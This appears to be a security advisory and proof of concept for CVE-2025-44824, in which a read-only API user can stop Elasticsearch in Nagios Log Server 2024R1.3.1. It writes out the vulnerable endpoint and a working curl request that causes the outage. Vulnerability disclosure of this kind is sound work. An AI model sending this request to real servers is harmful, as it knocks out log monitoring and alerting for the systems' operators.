# Authenticated Elasticsearch DoS via API in Nagios Log Server 2024R1.3.1

[▶️ PoC Demo](https://www.youtube.com/watch?v=YPK0-b9GeV8&ab_channel=SethKraft)

#### CVE ID: [CVE-2025-44824](https://nvd.nist.gov/vuln/detail/CVE-2025-44824)
#### Date: 2025-04-02
#### Exploit Author: Seth Kraft
#### Vendor Homepage: https://www.nagios.com/
#### Vendor Changelog: https://www.nagios.com/changelog/#log-server
#### Software Link: https://assets.nagios.com/downloads/nagios-log-server/versions.php
#### Version: 2024R1.3.1 and below
#### Tested On: Nagios Log Server 2024R1.3.1 (default configuration, Ubuntu 20.04)
#### CWE: CWE-863 (Incorrect Authorization)
#### CVSS: 8.5 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:H`

## Authorization
**For research and authorized testing only.** Please do not use against systems without permission.

## Summary
A vulnerability exists in the latest version (2024R1.3.1) of Nagios Log Server that allows a low-privileged user with read-only API access to remotely stop the Elasticsearch service via API call.

Elasticsearch is a core dependency of Nagios Log Server. If it is stopped, logs cannot be indexed, alerts cannot be generated, and historical data retrieval fails, leading to a Denial of Service (DoS) condition. 

## Details
The API endpoint `system/stop` allows any user with API access to stop the Elasticsearch service, effectively disabling log monitoring.

## Vulnerable Endpoint:
```
http://<target-ip>/nagioslogserver/index.php/api/system/stop?subsystem=elasticsearch&token=<valid_token>`
```

## Proof of Concept (PoC)
**Step 1: Send API Request to Stop Elasticsearch Response (Incorrect Error Message)**

```bash
curl -X POST "http://<target-ip>/nagioslogserver/index.php/api/system/stop?subsystem=elasticsearch&token=<valid_token>"`
```

**Response (Incorrect Error Message)**

```json
{
"status": "error",
"message": "Could not stop elasticsearch"
}
```

> Despite the misleading error message — Elasticsearch actually stops, causing Nagios Log Server to lose functionality.

**Step 2: Verify Elasticsearch Is Down**
![image](https://github.com/user-attachments/assets/c0a36824-4179-491a-ae98-f1186aeac9b6)
> Nagios Log Server will remain inaccessible until the Elasticsearch service is started again.

---

## Disclaimer
This work was conducted outside of my employment and reflects my personal efforts in cybersecurity research.

---
